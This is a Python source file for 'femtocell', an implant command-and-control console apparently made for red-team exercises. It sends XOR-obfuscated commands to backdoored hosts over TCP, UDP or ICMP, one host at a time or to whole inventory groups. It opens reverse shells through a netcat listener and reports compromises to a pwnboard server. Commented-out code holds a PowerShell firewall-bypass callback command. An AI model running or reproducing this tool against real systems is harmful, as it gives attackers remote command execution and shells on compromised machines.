#!/usr/bin/env python3

import scapy.all as scapy
from prompt_toolkit import prompt
from prompt_toolkit.history import FileHistory
from prompt_toolkit.auto_suggest import AutoSuggestFromHistory
from termcolor import colored
import nclib
import os
import confuse
import socket, sys, time
import requests
import multiprocessing
from queue import Queue

parsedConfig = {}

baseparams = {"MODE": "", "FILE": "", "XOR": True, "PWNBOARD": ""}

cmdparams = {
    "RHOST": "",
    "RPORT": 445,
    "COMMAND": "msg * hi",
    "TRANSPORT": "TCP",
}

shellparams = {
    "RHOST": "",
    "RPORT": 445,
    "LHOST": "",
    "LPORT": 443,
    "TRANSPORT": "TCP",
}

groupparams = {
    "GROUP": "",
    "RHOST": "",
    "RPORT": 445,
    "COMMAND": "msg * hi",
    "TRANSPORT": "TCP",
}


def updatePwnboard(ip, mode):
    data = {"ip": ip, "application": "femtocell", "access_type": mode}
    try:
        req = requests.post(baseparams["PWNBOARD"], json=data, timeout=3)
    except Exception as E:
        print(E)


def listen():
    nc = nclib.Netcat(listen=(shellparams["LHOST"], shellparams["LPORT"]))
    nc.interact() # TODO does the connection close cleanly?
    nc.close()
    if baseparams["PWNBOARD"] != "": 
        updatePwnboard(shellparams["RHOST"], "shell")
    print(colored("\n[*] Shell closed.\n", "cyan"))


# def pingListen():
#     print(colored(f"[*] Waiting 15 seconds for callbacks.\n", "cyan"))
#     pkts = scapy.sniff(
#         iface="utun3", filter="icmp", timeout=15
#     ) 
#     tCallbacks = []

#     for packet in pkts:
#         if str(packet.getlayer(scapy.ICMP).type) == "8":
#             tCallbacks.append(packet[scapy.IP].src)

#     fCallbacks = list(dict.fromkeys(tCallbacks))
#     for ip in fCallbacks:
#         print(colored(f"[+] Ping received from: {ip}\n", "green"))
#         updatePwnboard(ip, "beacon")


# def initPing(params):
#     targetIP = params["LHOST"]
#     pingmode = "FC-CM-{}\00".format("powershell -c netsh adv f a r dir=out protocol=icmpv4 action=allow name=\"y\"; ping " + targetIP + " -n 1; netsh adv f delete rule name=\"y\"")
#     return pingmode


def validGroupKey():
    key = groupparams["GROUP"]

    try:
        parsedConfig[key]
    except KeyError:
        print(
            colored(
                f"[!] GROUP {key} does not exist. Setting GROUP value back to blank.\n",
                "red",
            )
        )
        groupparams["GROUP"] = ""
        return False

    return True


def getGroup():
    key = groupparams["GROUP"]
    loi = []

    if parsedConfig[key] == "hosts":
            loi.append(parsedConfig[key + ":hosts"])
    elif parsedConfig[key] == "children":
        subgroups = parsedConfig[key + ":children"]
        for item in subgroups:
            loi.append(parsedConfig[item + ":hosts"])

    return loi


def importConfig(op_1):
    config = confuse.Configuration("t", __name__)
    config.set_file(op_1)
    configItems = config["all"]["children"].get()
    for x in configItems:
        parsedConfig[x] = "x"
        if configItems[x].get("hosts"):
            parsedConfig[x] = "hosts"
            hostlist = []
            var = list(configItems[x].get("hosts").keys())[0]
            lIdx = var.find("[")
            rIdx = var.find("]")
            mIdx = var.find(":")
            lVal = var[lIdx + 1 : mIdx]
            rVal = var[mIdx + 1 : rIdx]
            for i in range(int(lVal), int(rVal) + 1):
                lHalf = var[0:lIdx]
                rHalf = var[rIdx + 1 : len(var)]
                hostlist.append(lHalf + str(i) + rHalf)
            parsedConfig[x + ":hosts"] = hostlist
        elif configItems[x].get("children"):
            parsedConfig[x] = "children"
            parsedConfig[x + ":children"] = list(configItems[x].get("children"))

    baseparams["FILE"] = op_1
    baseparams["MODE"] = "GROUP"
    print(colored(f"[+] Config {op_1} loaded. MODE set to GROUP.\n", "cyan"))


def print_groups():
    key = groupparams["GROUP"]

    if not validGroupKey():
        return

    if parsedConfig[key] == "hosts":
        print(key)
        print(parsedConfig[key + ":hosts"])
    elif parsedConfig[key] == "children":
        subgroups = parsedConfig[key + ":children"]
        for item in subgroups:
            print(item)
            print(parsedConfig[item + ":hosts"])


def xor_encrypt(byte_msg, byte_key):
    encrypt_byte = b""
    for b in byte_msg:
        encrypt_byte += chr(b ^ byte_key).encode()
    return encrypt_byte


def print_help(location):
    if location == "sub":
        print(
            colored(
                "\n[?] REQUIRED: set <key> <value>\n[?] BACK: back/exit\n[?] INFO: options\n[?] INFO: targets (GROUP mode only)\n[?] OPTIONAL: ping (group and cmd modes only)\n[?] REQUIRED: execute\n",
                "yellow",
            )
        )
    else:
        print(
            colored(
                "\n[?] REQUIRED: set mode <shell/cmd/group>\n[?] EXIT: exit\n[?] INFO: options\n[?] OPTIONAL: load <file.yml> (REQUIRED for GROUP mode)\n[?] REQUIRED: ready\n",
                "yellow",
            )
        )


def print_options(p):
    for item in p.keys():
        if baseparams["MODE"] == "GROUP" and item == "RHOST":
            continue
        print(colored(f"{item}: {p[item]}", "cyan"))
    print()

def print_banner():
    print(
        """
    ____               __                  ____
   / __/__  ____ ___  / /_____  ________  / / /
  / /_/ _ \/ __ `__ \/ __/ __ \/ ___/ _ \/ / / 
 / __/  __/ / / / / / /_/ /_/ / /__/  __/ / /  
/_/  \___/_/ /_/ /_/\__/\____/\___/\___/_/_/   

    ~ kindtime & m720

    """
    )

def main():
    print_banner()

    if not os.path.exists("./history"):
        os.system("mkdir history")

    while True:
        user_in = prompt(
            "FEMTOCELL // ",
            history=FileHistory("history/main.history"),
            auto_suggest=AutoSuggestFromHistory(),
        ).split()

        if len(user_in) == 3:
            user_cmd = user_in[0].upper()
            op_1 = user_in[1].upper()
            op_2 = user_in[2].upper()

            if user_cmd == "SET":
                baseparams[op_1] = op_2
                if op_1 == "MODE":
                    if ( baseparams["MODE"] == "SHELL" or baseparams["MODE"] == "CMD" or baseparams["MODE"] == "GROUP"):
                        pass
                    else:
                        print(
                            colored(
                                f"[!] MODE {op_2} does not exist. Setting MODE value back to blank.\n",
                                "red",
                            )
                        )
                        baseparams["MODE"] = ""
                        continue
                    print(colored(f"[*] Mode {op_2} set.\n", "cyan"))
                elif op_1 == "XOR":
                    if op_2 == "TRUE":
                        baseparams["XOR"] = True
                    elif op_2 == "FALSE":
                        baseparams["XOR"] = False
                    else:
                        print(
                            colored(f"[!] XOR can only be set to TRUE or FALSE.\n", "red")
                        )
                        continue
                    print(colored(f"[*] XOR set to {op_2}.\n", "cyan"))
                elif op_1 == "PWNBOARD":
                    op_2 = op_2.lower()
                    print(colored(f"[*] Pwnboard URL set to {op_2}.\n", "cyan"))
        elif len(user_in) == 2:
            user_cmd = user_in[0]
            op_1 = user_in[1]
            if user_cmd == "load":
                if os.path.exists(op_1):
                    importConfig(op_1)
                else:
                    print(colored(f"[!] File {op_1} doesn't exist.\n", "red"))
                    continue
            else:
                print_help("base")

        elif len(user_in) == 1:
            user_cmd = user_in[0].upper()

            if user_cmd == "EXIT":
                exit()
            elif user_cmd == "BANNER":
                print_banner()
            elif user_cmd == "HELP":
                print_help("base")
            elif user_cmd == "OPTIONS":
                print_options(baseparams)
            elif user_cmd == "READY":
                if baseparams["MODE"] == "SHELL":
                    ready(shellparams)
                elif baseparams["MODE"] == "CMD":
                    ready(cmdparams)
                elif baseparams["MODE"] == "GROUP":
                    if len(parsedConfig) == 0:
                        print(colored("[!] No config loaded.\n", "red"))
                        continue
                    ready(groupparams)
                else:
                    print(colored("[!] No mode set.\n", "red"))
                    print_options(baseparams)
            else:
                print_help("base")
        elif len(user_in) == 0:
            continue
        else:
            print_help("base")


def ready(params):
    while True:
        user_in = prompt(
            f'FEMTOCELL // {baseparams["MODE"]} // ',
            history=FileHistory("history/interact.history"),
            auto_suggest=AutoSuggestFromHistory(),
        ).split()

        if len(user_in) == 1:
            user_cmd = user_in[0].upper()

            if user_cmd == "BACK" or user_cmd == "EXIT":
                return
            elif user_cmd == "BANNER":
                print_banner()
            elif user_cmd == "OPTIONS":
                print_options(params)
            elif user_cmd == "HELP":
                print_help("sub")
            elif baseparams["MODE"] == "GROUP" and user_cmd == "TARGETS":
                if params["GROUP"] == "":
                    print(colored("[!] No GROUP set.\n", "red"))
                    continue
                print_groups()
            elif user_cmd == "EXECUTE":
                if baseparams["MODE"] == "CMD" and verify(cmdparams):
                    plaintext = "FC-CM-{}\00".format(params["COMMAND"])
                    ip = cmdparams["RHOST"]
                    print(colored(f"[*] Sending {plaintext[6:]} --> {ip}\n", "cyan"))
                    execute(plaintext, cmdparams)
                elif baseparams["MODE"] == "SHELL" and verify(shellparams):
                    plaintext = "FC-SH-{}\00".format(params["LHOST"])
                    ip = shellparams["RHOST"]
                    t = multiprocessing.Process(target=listen)
                    t.start() # start listener
                    print(colored(f"[*] Sending {plaintext[6:]} --> {ip}\n", "cyan"))
                    execute(plaintext, shellparams)
                    try:
                        t.join() # wait until thread is finished
                    except KeyboardInterrupt:
                        t.terminate()
                elif baseparams["MODE"] == "GROUP" and verify(groupparams):
                    plaintext = "FC-CM-{}\00".format(params["COMMAND"])
                    if parsedConfig.get(groupparams.get("GROUP")) == "":
                        continue
                    groupList = getGroup()
                    for iplist in groupList:
                        for ip in iplist:
                            groupparams["RHOST"] = ip
                            print(colored(f"[*] Sending {plaintext[6:]} --> {ip}\n", "cyan"))
                            t = multiprocessing.Process(target=execute, args=(plaintext,groupparams,))
                            t.start()
                    t.join()
                else:
                    print_help("sub")
                    continue
            # elif user_cmd == "PING": # under contruction
            #     if baseparams["MODE"] == "CMD" and verify(cmdparams):
            #         plaintext = initPing(cmdparams)
            #         t = multiprocessing.Process(target=pingListen, args=())
            #         t.start()
            #         time.sleep(2)
            #         execute(plaintext, cmdparams)
            #         t.join()
            #     elif baseparams["MODE"] == "GROUP" and verify(groupparams):
            #         if parsedConfig.get(groupparams.get("GROUP")) == "":
            #             continue
            #         groupList = getGroup()
            #         plaintext = initPing(groupparams)
            #         t = multiprocessing.Process(target=pingListen, args=())
            #         t.start()
            #         time.sleep(2)
            #         for iplist in groupList:
            #             for ip in iplist:
            #                 groupparams["RHOST"] = ip
            #                 e = multiprocessing.Process(target=execute, args=(plaintext,groupparams,))
            #                 e.start()
            #         e.join()
            #         t.join()

                # else:
                #     print(colored("[!] PING only works on GROUP or CMD mode.\n", "red"))
                #     continue
            else:
                print_help("sub")
                continue
        elif len(user_in) == 3:
            user_cmd = user_in[0].upper()
            op_1 = user_in[1].upper()
            op_2 = user_in[2].upper()

            if user_cmd == "SET":
                if op_1 in params.keys():
                    if op_1 == "RPORT": 
                        op_2 = int(op_2)
                    elif op_1 == "GROUP" or op_1 == "COMMAND":
                        op_2 = op_2.lower()
                    params[op_1] = op_2
                    print_options(params)
                else:
                    print_help("sub")
            else:
                print_help("sub")
        elif len(user_in) > 3:
            user_cmd = user_in[0].upper()
            op_1 = user_in[1].upper()

            if user_cmd == "SET":
                if op_1 == "COMMAND":
                    op_2 = ""
                    for i in range(2, len(user_in)):
                        op_2 = op_2 + user_in[i] + " "
                params[op_1] = op_2.strip(" ")
                print_options(params)
            else:
                print_help("sub")
        elif len(user_in) == 0:
            continue
        else:
            print_help("sub")


def verify(params):
    passing = False

    if params["TRANSPORT"] in ["TCP", "UDP", "ICMP"]: 
        passing = True
    else:
        print(
            colored("[!] TRANSPORT set incorrectly. Setting TRANSPORT to TCP.\n", "red")
        )
        params["TRANSPORT"] = "TCP"

    if baseparams["MODE"] != "GROUP" and params["RHOST"] == "":
        print(colored("[!] RHOST required.\n", "red"))
        passing = False

    if baseparams["MODE"] == "SHELL" and params["LHOST"] == "":
        print(colored("[!] LHOST required.\n", "red"))
        passing = False

    if baseparams["MODE"] == "GROUP" and not validGroupKey():
        passing = False

    return passing


def execute(plaintext, params):
    if baseparams["XOR"]:
        payload = xor_encrypt(plaintext.encode(), 0x10)
    else:
        payload = plaintext.encode()

    if params["TRANSPORT"] == "ICMP":
        scapy.send(scapy.IP(dst=params["RHOST"].encode())/
        scapy.ICMP(code=1, type=8)/
        payload, verbose=False)
        return

    if params["TRANSPORT"] == "UDP":
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    elif params["TRANSPORT"] == "TCP":
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try:
        sock.connect((params["RHOST"], params["RPORT"]))
        sock.send(payload)
    except (TimeoutError, ConnectionRefusedError):
        rport = params.get("RPORT")
        rhost = params.get("RHOST")
        print(colored(f"[-] Port {rport} not open on {rhost}.", "red"))
    finally:
        sock.close()


if __name__ == "__main__":
    main()
